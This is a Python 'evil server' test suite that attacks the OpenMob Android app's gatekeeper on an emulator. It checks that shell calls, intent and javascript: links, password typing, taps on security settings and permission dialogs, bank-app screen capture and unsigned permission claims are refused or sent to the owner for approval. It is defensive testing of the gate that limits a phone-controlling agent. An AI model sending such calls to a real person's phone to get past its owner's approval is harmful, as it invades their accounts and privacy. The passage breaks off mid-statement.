"""Evil-server suite against the real OpenMob app on an emulator (design §8; review B7). NOT run by pytest.

It plays a compromised server: a bare protocol-v1 WebSocket server that the app on an **emulator** connects to, then
sends raw calls and checks that the phone's gatekeeper refuses them or asks its owner. Unlike
tests/test_gatekeeper_adversarial.py (which attacks a simulated phone), this exercises the Android code around the
engine: the accessibility tree, screen capture, ConnectionService dispatch, the re-checks in PhoneActions, the
phone-owned prompt and its screen-lock signature.

The owner's side is played over adb: prompts are found with `uiautomator dump` (saved as evidence), answered by
tapping Approve / Deny and typing the emulator's PIN into the device-credential screen.

Setup (docs/testing.md, "Gatekeeper suite on an emulator"):
  1. An emulator with a PIN (`adb -s emulator-5554 shell locksettings set-pin 1234`), the debug APK installed and
     OpenMob's accessibility service on, plus the stand-in apps built from tests/adversarial/standins
     (`com.example.bank`, `com.example.shop`, `com.example.login`).
  2. python tests/adversarial/evil_server.py --serial emulator-5554 --port 8911 --token <t> --pin 1234 --out <dir>
  3. Pair the app once to http://10.0.2.2:8911 with the token (Use a developer token instead). With --restart the
     suite restarts the app between groups (fresh rate limits and denial counts) and waits for it to reconnect.

Phase 5 added groups for what the phone learned after B7: `deeplinks` (open_settings), `typing` (type_text replace),
`links` (open_url schemes, the bank as a verified https handler), `hidden` (a window hidden from accessibility),
`methods` (wait_for, task_grant and the other methods B7 never called) and `never` (Don't ask turned on through the
signed mode_change prompt, then ended by the server's tightening). The stand-ins gained the login app's OTP field and
HiddenActivity and the bank's TransferActivity for them.

Every adb call names the device (`-s <serial>`). Never point it at the owner's own phone: it opens apps and taps.
"""

from __future__ import annotations

import argparse
import base64
import asyncio
import io
import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import time
from typing import Callable

import websockets

RESULTS: list[tuple[str, str, bool, str]] = []  # (group, name, ok, evidence)
OWN = "dev.openmob.companion"
TASK = "t-evil"
ADB = os.environ.get("ADB") or shutil.which("adb") or os.path.expanduser(
    os.path.join(os.environ.get("ANDROID_HOME", "~/Android/Sdk"), "platform-tools", "adb"))


# --------------------------------------------------------------------------------------------- the emulator (adb)

class Device:
    def __init__(self, serial: str, out: str, pin: str | None):
        if not serial:
            sys.exit("--serial is required (never run against a phone you didn't name)")
        self.serial, self.out, self.pin = serial, out, pin
        self.phone: "Phone | None" = None
        os.makedirs(out, exist_ok=True)

    def adb(self, *args: str, timeout: int = 30) -> str:
        return subprocess.run([ADB, "-s", self.serial, *args], capture_output=True, text=True, timeout=timeout).stdout

    def sh(self, cmd: str) -> str:
        return self.adb("shell", cmd)

    def installed(self, package: str) -> bool:
        return f"package:{package}\n" in self.adb("shell", "pm", "list", "packages", package) + "\n"

    # The screen is read through the phone's own `ui_elements` (what a server sees), not `uiautomator dump`:
    # UiAutomation suppresses other accessibility services, which unbinds OpenMob's for the rest of the run.
    async def nodes(self) -> list[dict]:
        r = await self.phone.call("ui_elements")
        found = []
        for e in r.get("result") or []:
            b = e.get("bounds") or [0, 0, 0, 0]
            found.append({"text": e.get("text", ""), "content-desc": e.get("desc", ""), "hint": e.get("hint", ""),
                          "resource-id": e.get("resource_id", ""), "class": e.get("cls", ""), "box": b,
                          "center": ((b[0] + b[2]) // 2, (b[1] + b[3]) // 2), "covered": e.get("covered", False)})
        return found

    async def find(self, text: str, contains: bool = False, attr: str = "text") -> tuple[int, int] | None:
        for n in await self.nodes():
            v = n.get(attr, "")
            if text in v if contains else v == text:
                return n["center"]
        return None

    async def wait_find(self, text: str, timeout: float = 8, **kw) -> tuple[int, int] | None:
        end = time.time() + timeout
        while time.time() < end:
            p = await self.find(text, **kw)
            if p:
                return p
            await asyncio.sleep(0.5)
        return None

    async def save_dump(self, name: str) -> str:
        path = os.path.join(self.out, name + ".txt")
        with open(path, "w") as f:
            f.write(self.focus() + "\n")
            for n in await self.nodes():
                if n.get("text") or n.get("content-desc") or n.get("hint"):
                    f.write(f"{n.get('text')!r}\t{n.get('content-desc')!r}\thint={n.get('hint')!r}\t{n.get('resource-id')}\t{n.get('box')}\n")
        return path

    def shot(self, name: str) -> str:
        path = os.path.join(self.out, name + ".png")
        with open(path, "wb") as f:
            f.write(subprocess.run([ADB, "-s", self.serial, "exec-out", "screencap", "-p"], capture_output=True,
                                   timeout=30).stdout)
        return path

    def focus(self) -> str:
        m = re.search(r"mCurrentFocus=Window\{\S+ \S+ ([^}]+)\}", self.sh("dumpsys window | grep mCurrentFocus"))
        return m.group(1) if m else ""

    def awake(self) -> bool:
        return "mWakefulness=Awake" in self.sh("dumpsys power | grep mWakefulness=")

    def unlock(self) -> None:
        if not self.awake():
            self.sh("input keyevent WAKEUP")
            time.sleep(1)
        if "isKeyguardShowing=true" in self.sh("dumpsys window | grep -i keyguard") or "showing=true" in self.sh(
                "dumpsys activity activities | grep -i 'mKeyguardShowing\\|KeyguardController' | head -3"):
            self.sh("wm dismiss-keyguard")
            time.sleep(1)
            if self.pin:
                self.sh(f"input text {self.pin}")
                self.sh("input keyevent 66")
                time.sleep(1.5)

    def logcat_clear(self) -> None:
        self.adb("logcat", "-c")

    def log(self, tag: str) -> str:
        return self.adb("logcat", "-d", "-s", f"{tag}:I")

    def home(self) -> None:
        self.sh("input keyevent HOME")
        time.sleep(1)

    # --- the owner, on the phone ---------------------------------------------------------------------------------

    # The prompt's text and buttons are hidden from accessibility services (setAccessibilityDataSensitive), so
    # the server can't see them through `ui_elements`; the owner's eyes here are `uiautomator dump`. That
    # suppresses OpenMob's accessibility service, so it is turned back on afterwards ([restore_service]).
    def ua_nodes(self, save: str | None = None) -> list[dict]:
        self.sh("uiautomator dump /sdcard/ui.xml >/dev/null 2>&1")
        xml = self.sh("cat /sdcard/ui.xml")
        found = []
        for m in re.finditer(r"<node ([^>]*?)/?>", xml):
            a = dict(re.findall(r'([\w-]+)="([^"]*)"', m.group(1)))
            b = [int(v) for v in re.findall(r"\d+", a.get("bounds", "[0,0][0,0]"))]
            a["box"], a["center"] = b, ((b[0] + b[2]) // 2, (b[1] + b[3]) // 2)
            found.append(a)
        if save:
            with open(os.path.join(self.out, save + ".txt"), "w") as f:
                f.write(self.focus() + "\n")
                for n in found:
                    if n.get("text") or n.get("content-desc"):
                        f.write(f"{n.get('package')}\t{n.get('text')!r}\t{n.get('content-desc')!r}\t{n.get('resource-id')}\t{n.get('bounds')}\n")
        return found

    async def restore_service(self) -> bool:
        self.sh("settings put secure enabled_accessibility_services null")
        await asyncio.sleep(1)
        self.sh(f"settings put secure enabled_accessibility_services {OWN}/.OpenMobAccessibilityService")
        for _ in range(20):
            await asyncio.sleep(0.5)
            r = await self.phone.call("current_app")
            if r.get("ok"):
                return True
        return False

    def prompt_layout(self) -> dict | None:
        """The open gate prompt's buttons, from `dumpsys activity` (the view hierarchy with bounds). The prompt is
        hidden from accessibility services (setAccessibilityDataSensitive) and from screenshots (FLAG_SECURE), and
        `uiautomator dump` would unbind OpenMob's accessibility service (which renumbers windows and so voids the
        permit the honest server is about to use), so the owner's eyes are the activity dump."""
        out = self.sh(f"dumpsys activity {OWN}/.ApprovalActivity")
        if "View Hierarchy:" not in out:
            return None
        stack: list[tuple[int, int, int]] = []  # (indent, abs left, abs top)
        views = []
        for line in out.split("View Hierarchy:", 1)[1].splitlines():
            m = re.match(r"^(\s*)([\w.$]+)\{\S+ (\S+) \S+ (-?\d+),(-?\d+)-(-?\d+),(-?\d+)", line)
            if not m:
                if line.strip() and not line.startswith("      "):
                    break
                continue
            indent = len(m.group(1))
            l, t, r, b = (int(m.group(i)) for i in range(4, 8))
            while stack and stack[-1][0] >= indent:
                stack.pop()
            px, py = (stack[-1][1], stack[-1][2]) if stack else (0, 0)
            stack.append((indent, px + l, py + t))
            views.append({"cls": m.group(2), "visible": m.group(3).startswith("V"), "indent": indent,
                          "box": (px + l, py + t, px + r, py + b)})
        buttons = [v for v in views if v["cls"].endswith(".Button") and v["visible"]]
        if len(buttons) < 2:
            return None
        center = lambda v: ((v["box"][0] + v["box"][2]) // 2, (v["box"][1] + v["box"][3]) // 2)
        return {"deny": center(buttons[-2]), "approve": center(buttons[-1]),
                "always": any(v["cls"].endswith("CheckBox") and v["visible"] for v in views)}

    async def prompt(self, timeout: float = 8, save: str | None = None) -> dict | None:
        """The phone's gate prompt (ApprovalActivity) if it comes up: whether "Always allow" is offered, and where
        its buttons are. Its wording is the gate reply's `question` (the phone's own words)."""
        end = time.time() + timeout
        while time.time() < end:
            if "ApprovalActivity" in self.focus():
                await asyncio.sleep(0.5)
                p = self.prompt_layout()
                if p:
                    p["texts"] = [f"(always offered: {p['always']})"]
                    if save:
                        with open(os.path.join(self.out, save + ".txt"), "w") as f:
                            f.write(json.dumps(p) + "\n")
                    return p
            await asyncio.sleep(0.5)
        return None

    async def approve(self, name: str) -> dict | None:
        """Approve the open gate prompt with the screen lock (the PIN on the device-credential screen)."""
        p = await self.prompt(save=name + "-prompt")
        if not p:
            return None
        self.sh(f"input tap {p['approve'][0]} {p['approve'][1]}")
        await asyncio.sleep(2.5)
        p["credential_screen"] = self.focus()
        if self.pin:
            self.sh(f"input text {self.pin}")
            self.sh("input keyevent 66")
        await asyncio.sleep(2)
        return p

    async def deny(self, name: str) -> dict | None:
        p = await self.prompt(save=name + "-prompt")
        if not p:
            return None
        self.sh(f"input tap {p['deny'][0]} {p['deny'][1]}")
        await asyncio.sleep(1.5)
        return p

    def restart_app(self) -> None:
        """A fresh app process (fresh rate limits, denial counts and prompts); the owner presses Connect."""
        self.sh(f"am force-stop {OWN}")
        time.sleep(1)
        self.unlock()
        self.sh(f"am start -n {OWN}/.MainActivity")
        time.sleep(2.5)
        connect = next((n["center"] for n in self.ua_nodes() if n.get("text") == "Connect"), None)
        if not connect:  # the setup card is still expanded (a step undone): the Connection card sits below it
            self.sh("input swipe 540 2000 540 600 400")
            time.sleep(1)
            connect = next((n["center"] for n in self.ua_nodes() if n.get("text") == "Connect"), None)
        if connect:
            self.sh(f"input tap {connect[0]} {connect[1]}")
            time.sleep(1.5)
        self.home()
        self.sh("settings put secure enabled_accessibility_services null")
        time.sleep(1)
        self.sh(f"settings put secure enabled_accessibility_services {OWN}/.OpenMobAccessibilityService")
        time.sleep(2)


# --------------------------------------------------------------------------------------------- the protocol

class Phone:
    def __init__(self, ws, hello: dict):
        self.ws, self.hello = ws, hello
        self.n = 0
        self.waiting: dict[str, asyncio.Future] = {}
        self.events: list[dict] = []
        self.reader = asyncio.create_task(self._read())

    async def _read(self) -> None:
        try:
            async for raw in self.ws:
                if isinstance(raw, bytes):
                    size = int.from_bytes(raw[:4], "big")
                    message = json.loads(raw[4:4 + size])
                    message["binary"] = raw[4 + size:]
                    message["recv"] = time.time()
                    if message.get("type") == "video":
                        message["bytes"] = len(message["binary"])
                else:
                    message = json.loads(raw)
                fut = self.waiting.pop(message.get("id", ""), None) if message.get("type") == "result" else None
                if fut and not fut.done():
                    fut.set_result(message)
                else:
                    self.events.append(message)
        except websockets.ConnectionClosed:
            pass

    async def call(self, method: str, timeout: float = 30, **params) -> dict:
        self.n += 1
        cid = f"c{self.n}"
        fut = asyncio.get_running_loop().create_future()
        self.waiting[cid] = fut
        params.setdefault("task", TASK)
        await self.ws.send(json.dumps({"type": "call", "id": cid, "method": method, "params": params}))
        try:
            return await asyncio.wait_for(fut, timeout)
        except asyncio.TimeoutError:
            return {"ok": False, "code": "timeout"}

    async def event(self, pred: Callable[[dict], bool], timeout: float = 20) -> dict | None:
        end = time.time() + timeout
        seen = 0
        while time.time() < end:
            for e in self.events[seen:]:
                if pred(e):
                    return e
            seen = len(self.events)
            await asyncio.sleep(0.2)
        return None

    async def gate_state(self, approval_id: str, timeout: float = 20) -> str:
        e = await self.event(lambda e: e.get("type") == "gate_event" and e.get("approval_id") == approval_id
                             and e.get("state") in ("approved", "denied", "expired"), timeout)
        return e["state"] if e else "none"

    def pending_count(self) -> int:
        return sum(1 for e in self.events if e.get("type") == "gate_event" and e.get("state") == "pending")


def short(reply: dict) -> str:
    r = {k: v for k, v in reply.items() if k not in ("binary", "type", "id")}
    return json.dumps(r)[:300]


def check(group: str, name: str, ok: bool, evidence: str = "") -> bool:
    RESULTS.append((group, name, ok, evidence))
    print(("PASS " if ok else "FAIL ") + f"[{group}] {name}  ({evidence[:400]})", flush=True)
    return ok


def refused(reply: dict, *codes: str) -> bool:
    return reply.get("ok") is False and reply.get("code") in codes


def asks(reply: dict) -> bool:
    return refused(reply, "gate_needs_approval") and str(reply.get("approval_id", "")).startswith("gk")


async def run(dev: Device, fn, *a):
    return await asyncio.get_running_loop().run_in_executor(None, fn, *a)


async def approved_resend(phone: Phone, dev: Device, name: str, method: str, **params) -> tuple[dict, dict | None, dict]:
    """The honest server's path: the call asks, the owner approves on the phone, the identical call is re-sent."""
    first = await phone.call(method, **params)
    if not asks(first):
        return first, None, first
    p = await dev.approve(name)
    state = await phone.gate_state(first["approval_id"])
    if state != "approved":
        return first, p, {"ok": False, "code": f"not approved ({state})"}
    return first, p, await phone.call(method, **params)


def jpeg_mean(data: bytes) -> float:
    try:
        from PIL import Image, ImageStat
        return sum(ImageStat.Stat(Image.open(io.BytesIO(data)).convert("L")).mean)
    except Exception:
        return -1.0


# --------------------------------------------------------------------------------------------- the groups

async def g_basics(phone: Phone, dev: Device) -> None:
    G = "basics"
    caps = phone.hello.get("device", {}).get("capabilities") or []
    check(G, "hello announces the gatekeeper", "gatekeeper" in caps and "approval_digest" in caps, str(caps))
    r = await phone.call("run_shell", cmd="id")
    check(G, "unknown methods are refused", refused(r, "gate_unknown_method"), short(r))
    r = await phone.call("launch_app", package=OWN)
    check(G, "OpenMob itself can't be launched", refused(r, "gate_blocked_app"), short(r))
    r = await phone.call("open_url", url="intent://x#Intent;package=com.example.bank;end")
    check(G, "intent: links are refused", refused(r, "gate_denied"), short(r))
    r = await phone.call("type_text", text="javascript:alert(1)")
    check(G, "javascript: is never typed", refused(r, "gate_denied"), short(r))
    if dev.installed("com.example.bank"):
        r = await phone.call("launch_app", package="com.example.bank")
        check(G, "launching the bank app is refused", refused(r, "gate_blocked_app"), short(r))
        for url, codes in (("examplebank://account/transfer", ("gate_denied",)),
                           ("https://bank.example.com/account", ("gate_blocked_app",))):
            r = await phone.call("open_url", url=url)
            time.sleep(1.5)
            focus = dev.focus()
            check(G, f"bank deep link {url.split(':')[0]}: refused, or not opened in the bank",
                  (refused(r, *codes) or r.get("ok") is True) and "com.example.bank" not in focus,
                  short(r) + f" focus={focus}")
            dev.home()
    # Server "approval" through the legacy path for a gate id, and an unsigned `never` claim.
    await phone.ws.send(json.dumps({"type": "permissions", "ceiling": "never", "until": int(time.time()) + 3600}))
    time.sleep(1)
    r = await phone.call("device_state")
    check(G, "the server's 'permissions: never' message isn't taken (policy hash unchanged)",
          phone.hello.get("device", {}).get("policy_hash") is not None, short(r))


SECURITY_PAGES = [  # (intent action, what it is): every tap on these must be refused
    ("android.settings.SECURITY_SETTINGS", "security (Safety Center)"),
    ("android.settings.ACCESSIBILITY_SETTINGS", "accessibility"),
    ("android.settings.MANAGE_DEFAULT_APPS_SETTINGS", "default apps"),
    ("android.settings.action.MANAGE_OVERLAY_PERMISSION", "display over other apps"),
    ("android.settings.USAGE_ACCESS_SETTINGS", "usage access"),
    ("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS", "notification access"),
    ("android.settings.MANAGE_UNKNOWN_APP_SOURCES", "install unknown apps"),
    ("android.settings.SYNC_SETTINGS", "accounts"),
    ("android.settings.VPN_SETTINGS", "VPN"),
    ("android.settings.LOCALE_SETTINGS", "language"),
    ("android.settings.SETTINGS", "Settings home (control: everyday, taps allowed)"),
]


async def g_settings(phone: Phone, dev: Device) -> None:
    G = "settings"
    dev.unlock()
    for action, what in SECURITY_PAGES:
        dev.sh("am force-stop com.android.settings")
        dev.sh("am force-stop com.google.android.permissioncontroller")
        dev.sh(f"am start -a {action}")
        await asyncio.sleep(3)
        page = dev.focus()
        name = "settings-" + what.split()[0].lower()
        dev.shot(name)
        rows = [n for n in await dev.nodes() if n.get("text") and 400 < n["box"][1] < 2200][:3]
        replies = []
        # With nothing readable (Safety Center hides its tree from non-tool services), tap blind at three rows.
        targets = [(n["center"], n["text"]) for n in rows] or [((540, y), f"blind y={y}") for y in (900, 1400, 1900)]
        for (x, y), label in targets:
            r = await phone.call("tap", x=x, y=y)
            replies.append((label, r))
            await asyncio.sleep(0.8)
            if r.get("ok"):  # it went through: look at where it went, then come back
                dev.sh("input keyevent BACK")
                await asyncio.sleep(1)
        codes = [r.get("code") or "ok" for _, r in replies]
        detail = f"page={page} " + "; ".join(f"{l!r}->{c}" for (l, _), c in zip(replies, codes))
        if "control" in what:
            check(G, f"{what}: ordinary taps go through", all(c == "ok" for c in codes), detail)
        else:
            check(G, f"{what}: every tap refused", all(c in ("gate_denied_page", "gate_screen_unstable") for c in codes), detail)
    # About phone → Build number asks (seven taps there turn on developer options).
    dev.sh("am force-stop com.android.settings")
    dev.sh("am start -a android.settings.DEVICE_INFO_SETTINGS")
    await asyncio.sleep(2.5)
    for _ in range(4):
        if await dev.find("Build number"):
            break
        await phone.call("swipe", x1=540, y1=1900, x2=540, y2=700, duration_ms=300)
        await asyncio.sleep(1)
    p = await dev.find("Build number")
    if not p:
        check(G, "Build number found", False, await dev.save_dump("settings-about"))
        return
    r = await phone.call("tap", x=p[0], y=p[1])
    prompt = await dev.prompt(save="settings-build-number-prompt")
    check(G, "tapping Build number asks on the phone", asks(r) and prompt is not None,
          short(r) + f" prompt={prompt and prompt['texts'][:3]}")
    if prompt:
        await dev.deny("settings-build-number")
        check(G, "the owner's Deny reaches the gate", await phone.gate_state(r["approval_id"]) == "denied", "")
    dev.home()


async def g_bank(phone: Phone, dev: Device) -> None:
    G = "bank"
    if not dev.installed("com.example.bank"):
        check(G, "stand-in bank installed", False, "skipped")
        return
    dev.unlock()
    # B2: the owner opens the bank (its onCreate takes 1.5 s) while the server hammers taps and reads. No touch may
    # reach the bank (it logs every touch), and no read may show its content. Five launches: it's a race.
    rounds, leaked, oks = [], [], []
    for i in range(int(os.environ.get("B2_ROUNDS", "5"))):
        dev.home()
        dev.sh("am force-stop com.example.bank")
        dev.logcat_clear()
        dev.sh("am start -n com.example.bank/.MainActivity")
        t0, codes = time.time(), {}
        while time.time() - t0 < 3.0:
            t = time.time() - t0
            r = await phone.call("tap", x=540, y=1500)
            code = r.get("code") or "ok"
            codes[code] = codes.get(code, 0) + 1
            if code == "ok" and t > 0.3:
                oks.append(f"round {i}: ok at +{t:.2f}s")
            if code == "gate_needs_approval":
                oks.append(f"round {i}: asked at +{t:.2f}s: {r.get('gate', {}).get('question')} "
                           f"({r.get('gate', {}).get('package')}, {r.get('gate', {}).get('rule')})")
                await dev.deny(f"bank-b2-ask-{i}")
            els = await phone.call("ui_elements")
            leaked += [e.get("text") for e in els.get("result") or [] if "12,345" in str(e) or "Account balance" in str(e)]
        await asyncio.sleep(0.5)
        touches = [l.split(": ", 1)[-1] for l in dev.log("BankStandIn").splitlines() if "TOUCH" in l]
        rounds.append((codes, touches))
    hit = [i for i, (_, t) in enumerate(rounds) if t]
    check(G, "taps while the bank loads never reach it (B2)", not hit,
          f"{len(rounds)} launches, touches reached the bank in rounds {hit}; allowed taps after +0.3 s: {oks}; "
          f"outcomes {[c for c, _ in rounds]}")
    check(G, "reads while the bank loads never show it", not leaked, f"leaked={leaked[:3]}")
    time.sleep(1)
    dev.shot("bank-emulator-screen")  # what the owner sees (the stand-in has no FLAG_SECURE)
    shot = await phone.call("screenshot")
    data = shot.get("binary", b"")
    if not data and isinstance(shot.get("result"), dict) and shot["result"].get("jpeg"):
        import base64
        data = base64.b64decode(shot["result"]["jpeg"])
    if data:
        with open(os.path.join(dev.out, "bank-server-screenshot.jpg"), "wb") as f:
            f.write(data)
    mean = jpeg_mean(data)
    check(G, "a screenshot of the bank app is black", shot.get("ok") is True and 0 <= mean < 3,
          f"mean luminance {mean:.2f}, {len(data)} bytes, meta={short(shot)[:120]}")
    els = await phone.call("ui_elements")
    check(G, "the bank app reads as []", els.get("ok") and els.get("result") == [], short(els)[:160])
    dev.logcat_clear()
    r = await phone.call("tap", x=540, y=1200)
    await asyncio.sleep(0.5)
    check(G, "taps in the bank app are refused", refused(r, "gate_blocked_app") and "TOUCH" not in dev.log("BankStandIn"),
          short(r))
    r = await phone.call("swipe", x1=540, y1=1800, x2=540, y2=600, duration_ms=300)
    check(G, "swipes in the bank app are refused", refused(r, "gate_blocked_app"), short(r))
    r = await phone.call("stream_start", max_side=720, bitrate=1_000_000, fps=15)
    check(G, "stream_start over the bank app is refused (B1)", refused(r, "gate_blocked_app"), short(r))
    r = await phone.call("current_app")
    check(G, "current_app still answers (no screen content)", r.get("ok") is True, short(r))
    dev.home()
    # B1: a live view already running when the owner opens the bank sends no frames of it.
    dev.sh("am force-stop com.example.bank")
    await asyncio.sleep(1)
    started = await phone.call("stream_start", max_side=720, bitrate=1_000_000, fps=15)
    if not started.get("ok"):  # the owner allows screen sharing for this connection (Android's own dialog)
        dev.sh(f"am start -n {OWN}/.MainActivity -a dev.openmob.action.SHARE_SCREEN")
        await asyncio.sleep(2.5)
        start = next((n["center"] for n in dev.ua_nodes() if n.get("text") == "Start"), None)
        if start:
            dev.sh(f"input tap {start[0]} {start[1]}")
            await asyncio.sleep(1.5)
        dev.home()
        await dev.restore_service()
        started = await phone.call("stream_start", max_side=720, bitrate=1_000_000, fps=15)
    if not started.get("ok"):
        check(G, "live view available for the B1 check (screen sharing accepted on the phone)", False, short(started))
        return
    await asyncio.sleep(2)
    first = next(i for i, e in enumerate(phone.events) if e.get("type") == "video")
    home_frames = sum(1 for e in phone.events if e.get("type") == "video" and e.get("bytes", 0) > 0)
    mark = len(phone.events)
    dev.sh("am start -n com.example.bank/.MainActivity")
    t_bank = time.time()
    await asyncio.sleep(6)  # 1.5 s loading (the bank draws nothing yet), then 4.5 s of the bank on screen
    during = [e for e in phone.events[mark:] if e.get("type") == "video"]
    await phone.call("stream_stop")
    # The bank's first frame can't exist before its onCreate returns (1.5 s); frames before 1 s are the launch
    # animation over the home screen. Anything later would show the bank.
    late = [e for e in during if e.get("bytes", 0) > 0 and not e.get("config") and e.get("recv", 0) - t_bank > 1.0]
    # Evidence: the whole stream (decode: ffmpeg -i bank-live.h264 bank-live-%03d.png) and arrival times.
    with open(os.path.join(dev.out, "bank-live.h264"), "wb") as f:
        for e in phone.events[first:]:
            if e.get("type") == "video":
                f.write(e.get("binary", b""))
    with open(os.path.join(dev.out, "bank-live-packets.txt"), "w") as f:
        for e in during:
            f.write(f"recv={e.get('recv', 0) - t_bank:+.3f}s key={e.get('key')} config={e.get('config')} "
                    f"pts={e.get('pts')} bytes={e.get('bytes')}\n")
    last = max((e.get("recv", 0) - t_bank for e in during if e.get("bytes", 0) > 0), default=None)
    check(G, "no live-view frames of the bank (B1)", home_frames > 0 and not late,
          f"{home_frames} frames on the home screen before; {len(during)} packets after the launch, the last at "
          f"{last and round(last, 2)} s (the bank draws at >= 1.5 s); {len(late)} after 1 s")
    dev.home()


async def g_login(phone: Phone, dev: Device) -> None:
    G = "login"
    if not dev.installed("com.example.login"):
        check(G, "stand-in login app installed", False, "skipped")
        return
    dev.unlock()
    dev.sh("am force-stop com.example.login")
    r = await phone.call("launch_app", package="com.example.login")
    check(G, "launching an ordinary app is allowed", r.get("ok") is True, short(r))
    time.sleep(2)
    dev.logcat_clear()
    pw = await dev.wait_find("Password", attr="text") or await dev.wait_find("Password", attr="hint")
    email = await dev.find("Email") or await dev.find("Email", attr="hint")
    if email:
        await phone.call("tap", x=email[0], y=email[1])
        time.sleep(0.8)
        r = await phone.call("type_text", text="owner@example.com")
        check(G, "typing an email is allowed (honest control)", r.get("ok") is True, short(r))
    if pw:
        r1 = await phone.call("tap", x=pw[0], y=pw[1])
        time.sleep(0.8)
        r = await phone.call("type_text", text="hunter2")
        time.sleep(0.5)
        log = dev.log("LoginStandIn")
        check(G, "typing into a password field is refused", refused(r, "gate_password_field") and "PASSWORD length" not in log,
              f"focus tap={short(r1)[:80]} type={short(r)} log={'PASSWORD' in log}")
    else:
        check(G, "password field found", False, await dev.save_dump("login-native"))
    # Autofill / IME surface over a WebView login form.
    dev.sh("am start -n com.example.login/.WebLoginActivity")
    time.sleep(3)
    e = await dev.wait_find("Email", attr="hint") or await dev.wait_find("Email", attr="text")
    if e:
        await phone.call("tap", x=e[0], y=e[1])
    time.sleep(2)
    ime = None
    out = dev.sh("dumpsys window windows | grep -E 'Window #|mFrame=|InputMethod' ")
    m = re.search(r"InputMethod[\s\S]*?frame=\[(\d+),(\d+)\]\[(\d+),(\d+)\]", out)
    if "mInputShown=true" in dev.sh("dumpsys input_method | grep mInputShown"):
        ime = (540, 2150)  # the keyboard's bottom rows
    dev.shot("login-webview-keyboard")
    if not ime:
        check(G, "keyboard (IME) up over the WebView form", False, await dev.save_dump("login-webview"))
    else:
        r = await phone.call("tap", x=ime[0], y=ime[1])
        prompt = await dev.prompt()
        check(G, "a tap in the keyboard/autofill surface over a WebView asks", asks(r) and prompt is not None,
              short(r) + f" prompt={prompt and prompt['texts'][:3]}")
        if prompt:
            check(G, "no 'Always allow' offered for a WebView fill", not prompt["always"], str(prompt["texts"][:4]))
            await dev.deny("login-webview-fill")
            await phone.gate_state(r["approval_id"])
    dev.sh("input keyevent BACK")
    dev.home()


async def perm_tap(phone: Phone, dev: Device, label: str, name: str) -> tuple[str, dict, dict | None]:
    """The agent taps a control the owner can see (found with uiautomator, then OpenMob's service is restored):
    its outcome, and the owner's answer to a prompt if one came (denied)."""
    ns = dev.ua_nodes(name)
    target = next((n for n in ns if n.get("text") == label), None)
    await dev.restore_service()
    if not target:
        return "missing", {}, None
    x, y = target["center"]
    r = await phone.call("tap", x=x, y=y)
    prompt = None
    if asks(r):
        prompt = await dev.deny(name + "-deny")
        await phone.gate_state(r["approval_id"])
    return r.get("code") or "ok", r, prompt


async def g_permissions(phone: Phone, dev: Device) -> None:
    G = "permissions"
    dev.unlock()
    for _ in range(3):  # a dialog left over from an earlier run: the owner says no
        if "permissioncontroller" not in dev.focus():
            break
        no = next((n["center"] for n in dev.ua_nodes() if n.get("resource-id", "").endswith("permission_deny_button")
                   or n.get("text", "").startswith("Don")), None)
        print("leftover permission dialog; deny at", no, flush=True)
        if no:
            dev.sh(f"input tap {no[0]} {no[1]}")
        await asyncio.sleep(1.5)
    await dev.restore_service()
    for perm in ("FINE", "COARSE", "BACKGROUND"):
        dev.sh(f"pm revoke com.example.login android.permission.ACCESS_{perm}_LOCATION")
        dev.sh(f"pm clear-permission-flags com.example.login android.permission.ACCESS_{perm}_LOCATION user-set user-fixed")
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.LocationActivity")
    await asyncio.sleep(2)
    b = await dev.wait_find("Use my location")
    r = await phone.call("tap", x=b[0], y=b[1])  # the agent works in this app: it becomes the session app
    await asyncio.sleep(2.5)
    dev.shot("perm-foreground-dialog")
    readable = [n["text"] for n in await dev.nodes() if n["text"]]
    check(G, "what the agent can read of the location dialog (Android 15 hides it from non-tool services)",
          True, f"focus={dev.focus()} ui_elements texts={readable[:8]}")
    granted = lambda: dev.sh("dumpsys package com.example.login | grep -E 'ACCESS_(FINE|COARSE|BACKGROUND)_LOCATION: granted=true'")
    outcomes = {}
    for label in ("While using the app", "Only this time", "Precise", "Approximate"):
        code, reply, prompt = await perm_tap(phone, dev, label, "perm-fg-" + label.split()[0].lower())
        outcomes[label] = code + (f" (prompt: {reply.get('gate', {}).get('question')})" if prompt else "")
        await asyncio.sleep(1)
    check(G, "no foreground location grant without the owner", not granted().strip(),
          f"{outcomes}; granted={granted().strip()!r}")
    dev.sh("input keyevent BACK")
    dev.home()


async def g_permissions_bg(phone: Phone, dev: Device) -> None:
    """The background-location page ("Allow all the time"), in its own group: with the dialog OCR'd (Android 14+), the
    foreground taps above now ask, and the owner's three denials there suspend the phone until a restart."""
    G = "permissions"
    dev.unlock()
    for _ in range(3):  # a dialog left over from the foreground group: the owner says no
        if "permissioncontroller" not in dev.focus():
            break
        no = next((n["center"] for n in dev.ua_nodes() if n.get("resource-id", "").endswith("permission_deny_button")
                   or n.get("text", "").startswith("Don")), None)
        if no:
            dev.sh(f"input tap {no[0]} {no[1]}")
        await asyncio.sleep(1.5)
    await dev.restore_service()
    granted = lambda: dev.sh("dumpsys package com.example.login | grep -E 'ACCESS_(FINE|COARSE|BACKGROUND)_LOCATION: granted=true'")
    # The owner grants foreground location themselves, then the app asks for background ("Allow all the time").
    dev.sh("pm grant com.example.login android.permission.ACCESS_FINE_LOCATION")
    dev.sh("pm grant com.example.login android.permission.ACCESS_COARSE_LOCATION")
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.LocationActivity")
    await asyncio.sleep(2)
    b = await dev.wait_find("Use location in background")
    await phone.call("tap", x=b[0], y=b[1])
    await asyncio.sleep(3)
    dev.shot("perm-background-page")
    page = dev.focus()
    readable = [n["text"] for n in await dev.nodes() if n["text"]]
    code, reply, prompt = await perm_tap(phone, dev, "Allow all the time", "perm-bg-always")
    await asyncio.sleep(1)
    bg = dev.sh("dumpsys package com.example.login | grep 'ACCESS_BACKGROUND_LOCATION: granted'").strip()
    check(G, "'Allow all the time' is refused or asks, and isn't granted",
          code in ("gate_screen_unstable", "gate_denied", "gate_denied_page", "gate_needs_approval") and "granted=true" not in bg,
          f"page={page} agent reads={readable[:6]} tap={code} {short(reply)[:200]} prompt={prompt} bg={bg!r}")
    # A control the rule file doesn't name ("Ask every time"): never a silent change.
    code, reply, prompt = await perm_tap(phone, dev, "Ask every time", "perm-bg-unknown")
    check(G, "an unrecognized permission control is refused or asks",
